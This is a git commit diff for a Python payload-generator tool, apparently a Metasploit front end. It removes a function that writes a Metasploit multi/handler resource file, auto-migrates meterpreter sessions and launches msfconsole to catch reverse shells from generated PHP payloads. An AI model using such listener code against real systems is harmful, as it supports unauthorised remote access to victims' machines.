2c8d8436ef43ae2746f249a1a26cd7a2382bb940
Matt Jones <matt.jones.85@gmail.com>
2013-08-13 13:25:42 +0100

    Removed startListener() function

--- src/platforms/php.py
+++ src/platforms/php.py
@@ -5,7 +5,6 @@ import subprocess as subp
 from src import menus
 from src.main import *
 from time import sleep
-from sys import exit
 
 # interface ip
 iface = iface_ip()
@@ -59,36 +58,6 @@ while 1:
 			f = open("output/"+filename, "w")
 			f.write(finalpl)
 			f.close()
-	
-		# start multi handler
-		answer = raw_input("\nStart matching handler Y/N? (Default Y) ")
-		if not answer or answer in ('Y','y',''):
-
-			# create rc file
-			rcfile = "output/php_listener.rc"
-			fw = open(rcfile, "w")
-			fw.write("use exploit/multi/handler\n")
-			fw.write("set PAYLOAD %s\n" % payload)
-			fw.write("set LHOST 0.0.0.0\n")
-			fw.write("set LPORT %s\n" % port)
-			fw.write("set ExitOnSession false\n")
-	
-			# set AutoRunScript for windows meterpreter
-			if not selection or selection in '4':
-				fw.write("set AutoRunScript migrate -f\n")
-		
-			fw.write("exploit -j -z")
-			fw.close()
-	
-			# start listener
-			subp.Popen("%s/msfconsole -r %s" % (msfpath(), rcfile), shell=True).wait()
-	
-			PrintInfo("Cleaning up...")
-			os.remove(rcfile)
-			os.remove("output/"+filename+".php")
-			sleep(1)
-			# return to main
-			break
 	
 		# return to main
 		EntContinue()
